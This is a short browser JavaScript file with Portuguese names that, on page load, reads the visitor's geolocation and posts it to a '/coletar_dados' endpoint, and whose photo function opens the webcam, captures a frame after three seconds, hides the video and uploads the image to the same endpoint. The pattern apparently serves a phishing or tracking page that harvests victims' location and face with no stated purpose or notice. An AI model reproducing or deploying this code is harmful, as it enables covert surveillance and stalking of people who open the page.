window.onload = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const dados = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: new Date().toLocaleString()
        };
  
        fetch("/coletar_dados", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(dados)
        });
      });
    }
  };
  
  function tirarFoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
  
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.style.display = "block";
        video.srcObject = stream;
  
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          video.style.display = "none";
  
          const imagem = canvas.toDataURL("image/png");
  
          fetch("/coletar_dados", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ foto_base64: imagem, timestamp: new Date().toLocaleString() })
          });
  
          stream.getTracks().forEach(track => track.stop());
        }, 3000);
      })
      .catch((err) => {
        console.error("Erro ao acessar câmera:", err);
      });
  }
  